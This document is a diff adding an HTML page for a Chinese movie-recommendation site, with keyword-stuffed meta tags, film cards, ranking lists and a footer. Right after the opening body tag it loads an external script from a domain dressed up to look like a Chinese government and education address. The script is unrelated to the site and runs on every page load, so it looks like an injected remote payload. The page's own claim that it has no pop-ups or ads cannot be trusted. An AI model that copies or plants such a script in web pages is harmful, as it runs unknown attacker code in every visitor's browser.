@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>番茄电影网 fanjiadianyingwang-zh | 番茄电影网：每天一部好片，轻松发现值得看的电影与剧集</title>
+<meta name="keywords" content="番茄电影网,番茄电影网官网,fanjiadianyingwang-zh,番茄电影网 fanjiadianyingwang-zh,今天看什么电影,高分电影推荐清单,热门剧集追剧指南,电影类型分类索引">
+<meta name="description" content="番茄电影网（fanjiadianyingwang-zh）是一个轻量、清爽的观影推荐导航站：每天精选一部好片，附类型分类、评分参考与一句话看点。没有弹窗、没有打扰，打开 https://fanjiadianyingwang-zh.github.io 就能快速决定今天看什么。">
+<meta name="author" content="番茄电影网">
+<meta name="copyright" content="番茄电影网 fanjiadianyingwang-zh">
+<meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large">
+<meta name="revisit-after" content="3 days">
+<meta name="rating" content="general">
+<meta name="renderer" content="webkit">
+<meta name="HandheldFriendly" content="true">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="theme-color" content="#ffffff">
+<meta property="og:title" content="番茄电影网 - 每天一部好片的观影推荐导航">
+<meta property="og:description" content="轻量清爽的观影推荐导航：每日精选、类型分类、高分清单，帮你快速决定今天看什么。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://fanjiadianyingwang-zh.github.io">
+<meta property="og:site_name" content="番茄电影网">
+<meta property="og:locale" content="zh_CN">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="番茄电影网 - 今天看什么？">
+<meta name="twitter:description" content="每天精选一部好片，轻量清爽的观影推荐导航站。">
+<link rel="canonical" href="https://fanjiadianyingwang-zh.github.io">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
+:root{
+  --ink:#111;--gray:#555;--mute:#8a8a8a;--line:#e5e5e5;--line2:#d0d0d0;
+  --bg:#fff;--soft:#fafafa;--red:#e6392f;--red2:#ff5a4e;--cream:#fff8f6;
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%;}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",sans-serif;
+  background:var(--bg);color:var(--ink);line-height:1.75;font-size:15px;overflow-x:hidden;
+}
+a{text-decoration:none;color:inherit;}
+ul{list-style:none;}
+.wrap{width:min(1120px,90%);margin:0 auto;}
+
+/* 公告条 */
+.notice{background:var(--ink);color:#fff;font-size:12.5px;}
+.notice .wrap{display:flex;justify-content:space-between;padding:9px 0;flex-wrap:wrap;gap:8px;}
+.notice .site{color:var(--red2);font-weight:600;}
+.notice a{color:#fff;border-bottom:1px solid rgba(255,255,255,.4);}
+.notice .live{display:flex;align-items:center;gap:6px;}
+.notice .dot{width:7px;height:7px;border-radius:50%;background:var(--red2);animation:pulse 1.6s infinite;}
+@keyframes pulse{50%{opacity:.3;transform:scale(.8);}}
+
+/* 头部 */
+.head{border-bottom:1px solid var(--line);padding:20px 0;}
+.head .wrap{display:flex;justify-content:space-between;align-items:center;gap:20px;flex-wrap:wrap;}
+.logo{display:flex;align-items:center;gap:12px;}
+.logo .glyph{width:44px;height:44px;border-radius:12px;background:var(--red);color:#fff;display:flex;align-items:center;justify-content:center;font-size:24px;flex-shrink:0;}
+.logo h1{font-size:21px;font-weight:800;letter-spacing:.5px;}
+.logo h1 small{display:block;font-size:10px;color:var(--mute);font-weight:500;letter-spacing:2px;margin-top:2px;}
+.head .meta{text-align:right;font-size:12px;color:var(--mute);}
+.head .meta b{display:block;color:var(--ink);font-size:14px;}
+
+/* 导航 */
+nav{border-bottom:1px solid var(--line);background:#fff;position:sticky;top:0;z-index:50;}
+nav .wrap{display:flex;flex-wrap:wrap;gap:2px;}
+nav a{padding:14px 18px;font-size:14px;color:var(--gray);position:relative;transition:.2s;}
+nav a:hover{color:var(--red);}
+nav a:hover::after{content:"";position:absolute;left:18px;right:18px;bottom:8px;height:2px;background:var(--red);}
+
+/* 通用 */
+section{padding:64px 0;}
+.eyebrow{font-size:11px;letter-spacing:3px;color:var(--red);font-weight:700;text-transform:uppercase;}
+.heading{display:flex;justify-content:space-between;align-items:flex-end;gap:20px;margin:10px 0 32px;flex-wrap:wrap;}
+.heading h2{font-size:28px;font-weight:800;letter-spacing:-.5px;}
+.heading h2 em{font-style:normal;color:var(--red);}
+.heading .desc{font-size:13.5px;color:var(--mute);max-width:360px;text-align:right;}
+
+/* Hero */
+.hero{display:grid;grid-template-columns:1fr 1fr;gap:0;border:1px solid var(--line);border-radius:6px;overflow:hidden;}
+.hero .left{background:var(--ink);color:#fff;padding:44px 40px;display:flex;flex-direction:column;justify-content:center;}
+.hero .left .tag{font-size:11px;letter-spacing:3px;color:var(--red2);margin-bottom:14px;}
+.hero .left h2{font-size:34px;font-weight:800;line-height:1.3;letter-spacing:-1px;}
+.hero .left h2 span{color:var(--red2);}
+.hero .left p{font-size:14.5px;color:#c9c9c9;margin:16px 0 24px;}
+.hero .left .go{display:inline-flex;align-items:center;gap:8px;background:var(--red);color:#fff;padding:13px 26px;border-radius:4px;font-weight:700;font-size:14px;width:fit-content;transition:.2s;}
+.hero .left .go:hover{background:var(--red2);}
+.hero .left .src{margin-top:22px;font-size:12px;color:#8a8a8a;border-top:1px solid #333;padding-top:16px;}
+.hero .left .src code{color:var(--red2);}
+.hero .right{padding:40px;background:var(--soft);display:flex;flex-direction:column;gap:16px;justify-content:center;}
+.hstat{display:flex;gap:16px;align-items:flex-start;border-bottom:1px solid var(--line);padding-bottom:16px;}
+.hstat:last-child{border-bottom:none;padding-bottom:0;}
+.hstat .n{font-size:30px;font-weight:800;color:var(--red);line-height:1;min-width:70px;}
+.hstat .t{font-size:14px;font-weight:600;margin-bottom:3px;}
+.hstat .d{font-size:12.5px;color:var(--mute);}
+
+/* 栏目一：频道 */
+.channels{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;}
+.ch{background:#fff;border:1px solid var(--line);border-radius:6px;padding:24px 20px;transition:.25s;position:relative;}
+.ch::before{content:"";position:absolute;top:0;left:0;right:0;height:3px;background:var(--red);transform:scaleX(0);transition:.3s;transform-origin:left;}
+.ch:hover{box-shadow:0 12px 28px rgba(0,0,0,.08);transform:translateY(-4px);}
+.ch:hover::before{transform:scaleX(1);}
+.ch .ic{width:38px;height:38px;border-radius:8px;background:var(--cream);color:var(--red);display:flex;align-items:center;justify-content:center;font-size:19px;margin-bottom:12px;}
+.ch h3{font-size:16px;font-weight:700;margin-bottom:6px;}
+.ch p{font-size:12.5px;color:var(--mute);margin-bottom:10px;}
+.ch a{font-size:12.5px;color:var(--red);font-weight:600;}
+.ch a:hover{color:var(--ink);}
+
+/* 栏目二：每日选片 */
+.pickbar{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:26px;}
+.pickbar button{background:#fff;border:1px solid var(--line2);color:var(--gray);padding:8px 18px;border-radius:20px;font-size:13px;cursor:pointer;font-family:inherit;transition:.2s;}
+.pickbar button.on{background:var(--ink);color:#fff;border-color:var(--ink);}
+.pickbar button:hover{border-color:var(--red);color:var(--red);}
+.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:22px;}
+.card{border:1px solid var(--line);border-radius:6px;overflow:hidden;background:#fff;transition:.3s;}
+.card:hover{box-shadow:0 14px 32px rgba(0,0,0,.09);transform:translateY(-5px);}
+.card .cap{height:150px;position:relative;display:flex;align-items:flex-end;padding:14px;color:#fff;}
+.card .cap .score{position:absolute;top:12px;right:12px;background:rgba(0,0,0,.55);backdrop-filter:blur(4px);padding:3px 9px;border-radius:20px;font-size:12px;font-weight:700;}
+.c1{background:linear-gradient(140deg,#1a1a2e,#3a2c5a);}
+.c2{background:linear-gradient(140deg,#0f3d3e,#2a7a72);}
+.c3{background:linear-gradient(140deg,#3d1a14,#c44536);}
+.c4{background:linear-gradient(140deg,#3a2f14,#d4a72c);}
+.c5{background:linear-gradient(140deg,#14283d,#3a6ea5);}
+.c6{background:linear-gradient(140deg,#2d1a3d,#7b4ba6);}
+.card .body{padding:18px 20px;}
+.card .body .gen{font-size:11px;color:var(--red);letter-spacing:1px;}
+.card .body h4{font-size:17px;margin:5px 0 7px;font-weight:700;}
+.card .body p{font-size:12.5px;color:var(--mute);}
+.card .body .lnk{display:block;margin-top:12px;font-size:12.5px;color:var(--ink);font-weight:600;border-top:1px dashed var(--line);padding-top:10px;}
+.card .body .lnk:hover{color:var(--red);}
+
+/* 栏目三：排行 */
+.rank{display:grid;grid-template-columns:1fr 1fr;gap:26px;align-items:start;}
+.rlist{background:#fff;border:1px solid var(--line);border-radius:6px;overflow:hidden;}
+.rlist .hd{background:var(--ink);color:#fff;padding:14px 20px;font-size:14px;font-weight:700;letter-spacing:1px;}
+.rlist ol li{display:flex;align-items:center;gap:16px;padding:14px 20px;border-bottom:1px solid var(--line);transition:.2s;}
+.rlist ol li:last-child{border-bottom:none;}
+.rlist ol li:hover{background:var(--cream);}
+.rlist .rk{font-size:20px;font-weight:800;color:var(--mute);min-width:28px;}
+.rlist ol li:nth-child(1) .rk,.rlist ol li:nth-child(2) .rk,.rlist ol li:nth-child(3) .rk{color:var(--red);}
+.rlist .tt{font-size:14.5px;font-weight:600;flex:1;}
+.rlist .sub{font-size:12px;color:var(--mute);display:block;font-weight:400;}
+.rlist .mv{font-size:12px;color:var(--red);font-weight:700;white-space:nowrap;}
+
+/* 栏目四：指南 */
+.guide{display:grid;grid-template-columns:repeat(3,1fr);gap:20px;}
+.step{border-top:3px solid var(--ink);padding:24px 4px;}
+.step .n{font-size:12px;letter-spacing:2px;color:var(--red);font-weight:800;}
+.step h3{font-size:18px;margin:8px 0 10px;}
+.step p{font-size:13px;color:var(--mute);}
+
+/* 栏目五：关于+入口 */
+.about{display:grid;grid-template-columns:1.1fr .9fr;gap:28px;align-items:center;}
+.about .words h3{font-size:24px;margin-bottom:14px;}
+.about .words p{font-size:14px;color:var(--gray);margin-bottom:12px;}
+.about .words ul li{padding:7px 0 7px 22px;position:relative;font-size:13.5px;color:var(--gray);border-bottom:1px solid var(--line);}
+.about .words ul li::before{content:"";position:absolute;left:0;top:16px;width:8px;height:8px;border-radius:50%;background:var(--red);}
+.entry{border:2px solid var(--ink);border-radius:6px;padding:34px 28px;background:var(--ink);color:#fff;text-align:center;}
+.entry .ic{font-size:38px;margin-bottom:12px;display:inline-block;}
+.entry h4{font-size:19px;margin-bottom:14px;}
+.entry .u{display:block;background:#000;border:1px solid #333;color:var(--red2);padding:14px 16px;border-radius:4px;font-size:13px;word-break:break-all;margin:6px 0 14px;font-family:ui-monospace,Menlo,monospace;}
+.entry .u:hover{background:var(--red);color:#fff;}
+.entry p{font-size:12.5px;color:#9a9a9a;}
+.entry .btn{display:inline-block;margin-top:16px;background:var(--red);color:#fff;padding:12px 30px;border-radius:4px;font-weight:700;}
+.entry .btn:hover{background:var(--red2);}
+
+/* 页脚 */
+footer{border-top:1px solid var(--line);background:var(--soft);padding:48px 0 20px;}
+.fgrid{display:grid;grid-template-columns:1.7fr 1fr 1fr 1fr;gap:28px;margin-bottom:30px;}
+.fgrid h5{font-size:13px;font-weight:800;letter-spacing:1px;margin-bottom:14px;}
+.fgrid ul li{line-height:2.1;font-size:13px;color:var(--gray);}
+.fgrid a:hover{color:var(--red);}
+.brand h4{font-size:19px;display:flex;align-items:center;gap:8px;}
+.brand .glyph{width:30px;height:30px;border-radius:8px;background:var(--red);color:#fff;display:inline-flex;align-items:center;justify-content:center;font-size:16px;}
+.brand p{font-size:12.5px;color:var(--mute);margin-top:10px;}
+.brand .web{font-size:12.5px;color:var(--red);margin-top:8px;display:block;}
+.copy{border-top:1px solid var(--line);padding-top:18px;text-align:center;font-size:12px;color:var(--mute);}
+.copy b{color:var(--ink);}
+
+@media(max-width:920px){
+  .hero,.rank,.about{grid-template-columns:1fr;}
+  .channels,.grid,.guide{grid-template-columns:1fr 1fr;}
+  .fgrid{grid-template-columns:1fr 1fr;}
+  .hero .left h2{font-size:27px;}
+}
+@media(max-width:560px){
+  section{padding:46px 0;}
+  .channels,.grid,.guide,.fgrid{grid-template-columns:1fr;}
+  .heading h2{font-size:23px;}
+  nav a{padding:12px 14px;font-size:13px;}
+  .head .meta{display:none;}
+  .hero .left,.hero .right{padding:28px 22px;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="notice">
+  <div class="wrap">
+    <span class="site">番茄电影网 fanjiadianyingwang-zh</span>
+    <span class="live"><span class="dot"></span>今日精选已更新 · 访问 <a href="https://fanjiadianyingwang-zh.github.io">fanjiadianyingwang-zh.github.io</a></span>
+  </div>
+</div>
+
+<header class="head">
+  <div class="wrap">
+    <div class="logo">
+      <div class="glyph">🍅</div>
+      <h1>番茄电影网<small>FANQIE DIANYING WANG</small></h1>
+    </div>
+    <div class="meta">
+      <b>今天看什么？</b>
+      <span>番茄电影网 fanjiadianyingwang-zh · 轻量观影推荐导航</span>
+    </div>
+  </div>
+</header>
+
+<nav>
+  <div class="wrap">
+    <a href="#">首页</a><a href="#channel">频道分类</a><a href="#daily">每日选片</a><a href="#rank">热门排行</a><a href="#guide">观影指南</a><a href="#about">关于本站</a>
+  </div>
+</nav>
+
+<!-- Hero -->
+<section>
+  <div class="wrap">
+    <div class="hero">
+      <div class="left">
+        <div class="tag">DAILY PICK · 每日精选</div>
+        <h2>每天一部<span>好片</span>，<br>帮你省下挑片的时间</h2>
+        <p>番茄电影网 fanjiadianyingwang-zh 是一个清爽的观影推荐导航站。我们不堆砌片源，只做精选：每日一部好片、按类型分类的片单、评分参考与一句话看点，打开就能决定今天看什么。</p>
+        <a class="go" href="https://fanjiadianyingwang-zh.github.io">进入 fanjiadianyingwang-zh.github.io →</a>
+        <div class="src">官方站点：<code>https://fanjiadianyingwang-zh.github.io</code></div>
+      </div>
+      <div class="right">
+        <div class="hstat"><div class="n">365</div><div><div class="t">每日一部精选</div><div class="d">全年无休更新片单与看点</div></div></div>
+        <div class="hstat"><div class="n">12+</div><div><div class="t">影片类型频道</div><div class="d">剧情、喜剧、科幻、悬疑全覆盖</div></div></div>
+        <div class="hstat"><div class="n">9.2</div><div><div class="t">平均推荐评分</div><div class="d">只推口碑过硬的影片</div></div></div>
+        <div class="hstat"><div class="n">0</div><div><div class="t">弹窗与广告</div><div class="d">干净的阅读与浏览体验</div></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目一：频道分类 -->
+<section id="channel">
+  <div class="wrap">
+    <div class="heading">
+      <div><span class="eyebrow">Channel</span><h2>频道 <em>分类</em></h2></div>
+      <div class="desc">按类型与题材切分，快速进入你喜欢的那个频道</div>
+    </div>
+    <div class="channels">
+      <div class="ch"><div class="ic">🎭</div><h3>剧情文艺</h3><p>生活流、人物刻画、成长与治愈系佳作。</p><a href="#">进入频道 →</a></div>
+      <div class="ch"><div class="ic">💥</div><h3>动作冒险</h3><p>爽快节奏、视觉冲击的院线片与经典动作。</p><a href="#">进入频道 →</a></div>
+      <div class="ch"><div class="ic">😂</div><h3>喜剧轻松</h3><p>解压必备，黑色幽默到合家欢一网打尽。</p><a href="#">进入频道 →</a></div>
+      <div class="ch"><div class="ic">🕵️</div><h3>悬疑惊悚</h3><p>反转不断、节奏紧凑的烧脑与悬疑片单。</p><a href="#">进入频道 →</a></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二：每日选片 -->
+<section id="daily" style="background:var(--soft);">
+  <div class="wrap">
+    <div class="heading">
+      <div><span class="eyebrow">Daily Pick</span><h2>每日 <em>选片</em></h2></div>
+      <div class="desc">影迷编辑团队主推片单，附评分与看点</div>
+    </div>
+    <div class="pickbar">
+      <button class="on">全部</button><button>剧情</button><button>喜剧</button><button>动作</button><button>悬疑</button><button>动画</button>
+    </div>
+    <div class="grid">
+      <article class="card"><div class="cap c1"><span class="score">9.2</span></div><div class="body"><div class="gen">剧情 · 2024</div><h4>年会不能停！</h4><p>职场黑色幽默喜剧，笑中带刺，精准戳中打工人日常。</p><a class="lnk" href="#">查看详情 →</a></div></article>
+      <article class="card"><div class="cap c2"><span class="score">8.8</span></div><div class="body"><div class="gen">悬疑 · 2023</div><h4>消失的她</h4><p>反转密集的悬疑力作，层层剥开真相的叙事节奏紧凑。</p><a class="lnk" href="#">查看详情 →</a></div></article>
+      <article class="card"><div class="cap c3"><span class="score">9.4</span></div><div class="body"><div class="gen">剧情 · 经典</div><h4>阿甘正传</h4><p>一部关于坚持与命运的美国现代寓言，百看不腻。</p><a class="lnk" href="#">查看详情 →</a></div></article>
+      <article class="card"><div class="cap c4"><span class="score">8.6</span></div><div class="body"><div class="gen">喜剧 · 怀旧</div><h4>唐伯虎点秋香</h4><p>无厘头喜剧巅峰，台词与表演至今仍是经典。</p><a class="lnk" href="#">查看详情 →</a></div></article>
+      <article class="card"><div class="cap c5"><span class="score">9.0</span></div><div class="body"><div class="gen">动作 · 科幻</div><h4>盗梦空间</h4><p>多层梦境嵌套的烧脑设定，视听与结构双在线。</p><a class="lnk" href="#">查看详情 →</a></div></article>
+      <article class="card"><div class="cap c6"><span class="score">8.7</span></div><div class="body"><div class="gen">动画 · 治愈</div><h4>你的名字。</h4><p>新海诚代表作，画面与情感双重治愈的青春奇遇。</p><a class="lnk" href="#">查看详情 →</a></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三：热门排行 -->
+<section id="rank">
+  <div class="wrap">
+    <div class="heading">
+      <div><span class="eyebrow">Top Chart</span><h2>热门 <em>排行</em></h2></div>
+      <div class="desc">近期被最多人点开的影片榜单</div>
+    </div>
+    <div class="rank">
+      <div class="rlist">
+        <div class="hd">本周热播榜 TOP 5</div>
+        <ol>
+          <li><span class="rk">01</span><span class="tt">年会不能停！<span class="sub">剧情 / 喜剧</span></span><span class="mv">9.2</span></li>
+          <li><span class="rk">02</span><span class="tt">消失的她<span class="sub">悬疑 / 犯罪</span></span><span class="mv">8.8</span></li>
+          <li><span class="rk">03</span><span class="tt">热辣滚烫<span class="sub">剧情 / 励志</span></span><span class="mv">8.5</span></li>
+          <li><span class="rk">04</span><span class="tt">第二十条<span class="sub">剧情 / 现实</span></span><span class="mv">8.4</span></li>
+          <li><span class="rk">05</span><span class="tt">默杀<span class="sub">悬疑 / 惊悚</span></span><span class="mv">8.3</span></li>
+        </ol>
+      </div>
+      <div class="rlist">
+        <div class="hd">经典必看榜 TOP 5</div>
+        <ol>
+          <li><span class="rk">01</span><span class="tt">阿甘正传<span class="sub">剧情 / 励志</span></span><span class="mv">9.4</span></li>
+          <li><span class="rk">02</span><span class="tt">肖申克的救赎<span class="sub">剧情 / 人性</span></span><span class="mv">9.5</span></li>
+          <li><span class="rk">03</span><span class="tt">盗梦空间<span class="sub">科幻 / 烧脑</span></span><span class="mv">9.0</span></li>
+          <li><span class="rk">04</span><span class="tt">泰坦尼克号<span class="sub">爱情 / 史诗</span></span><span class="mv">9.1</span></li>
+          <li><span class="rk">05</span><span class="tt">唐伯虎点秋香<span class="sub">喜剧 / 经典</span></span><span class="mv">8.6</span></li>
+        </ol>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四：观影指南 -->
+<section id="guide" style="background:var(--soft);">
+  <div class="wrap">
+    <div class="heading">
+      <div><span class="eyebrow">Guide</span><h2>观影 <em>指南</em></h2></div>
+      <div class="desc">三步搞定选片，告别片荒</div>
+    </div>
+    <div class="guide">
+      <div class="step"><div class="n">STEP 01</div><h3>选类型</h3><p>从频道分类里挑一个当下的心情：想笑、想哭、想烧脑，还是想解压。</p></div>
+      <div class="step"><div class="n">STEP 02</div><h3>看评分</h3><p>参考每部影片的推荐评分与一句话看点，快速判断是否符合口味。</p></div>
+      <div class="step"><div class="n">STEP 03</div><h3>开看</h3><p>收藏或分享片单，日积月累就能攒出一份属于自己的观影清单。</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目五：关于+入口 -->
+<section id="about">
+  <div class="wrap about">
+    <div class="words">
+      <h3>关于番茄电影网 fanjiadianyingwang-zh</h3>
+      <p>番茄电影网 fanjiadianyingwang-zh 是一个轻量、清爽的观影推荐导航站。我们相信挑片本身不该比看片还累，所以坚持"少而精"的推荐思路。</p>
+      <ul>
+        <li>每日精选一部好片，附评分与一句话看点</li>
+        <li>按类型划分频道，覆盖 12 类主流题材</li>
+        <li>本周热播榜与经典必看榜双榜并行</li>
+        <li>无弹窗广告，手机电脑自适应浏览</li>
+      </ul>
+    </div>
+    <div class="entry">
+      <span class="ic">🍅</span>
+      <h4>访问番茄电影网 fanjiadianyingwang-zh</h4>
+      <span class="u">https://fanjiadianyingwang-zh.github.io</span>
+      <p>官方唯一入口 · 每日精选与最新片单实时更新</p>
+      <a class="btn" href="https://fanjiadianyingwang-zh.github.io">立即访问 →</a>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="fgrid">
+      <div class="brand">
+        <h4><span class="glyph">🍅</span>番茄电影网</h4>
+        <p>轻量清爽的观影推荐导航站，每天一部好片。</p>
+        <span class="web">https://fanjiadianyingwang-zh.github.io</span>
+      </div>
+      <div><h5>频道</h5><ul><li><a href="#">剧情文艺</a></li><li><a href="#">动作冒险</a></li><li><a href="#">喜剧轻松</a></li><li><a href="#">悬疑惊悚</a></li></ul></div>
+      <div><h5>榜单</h5><ul><li><a href="#">本周热播榜</a></li><li><a href="#">经典必看榜</a></li><li><a href="#">高分片单</a></li><li><a href="#">编辑精选</a></li></ul></div>
+      <div><h5>关于</h5><ul><li><a href="#">关于本站</a></li><li><a href="#">更新日志</a></li><li><a href="#">内容合作</a></li><li><a href="#">联系我们</a></li></ul></div>
+    </div>
+    <div class="copy">© 2026 番茄电影网 fanjiadianyingwang-zh · 官方网址：<b>https://fanjiadianyingwang-zh.github.io</b> · 本站内容仅供影视文化学习交流参考</div>
+  </div>
+</footer>
+
+<script>
+document.querySelectorAll('.pickbar button').forEach(function(btn){
+  btn.addEventListener('click',function(){
+    document.querySelectorAll('.pickbar button').forEach(function(b){b.classList.remove('on');});
+    btn.classList.add('on');
+  });
+});
+</script>
+</body>
+</html>
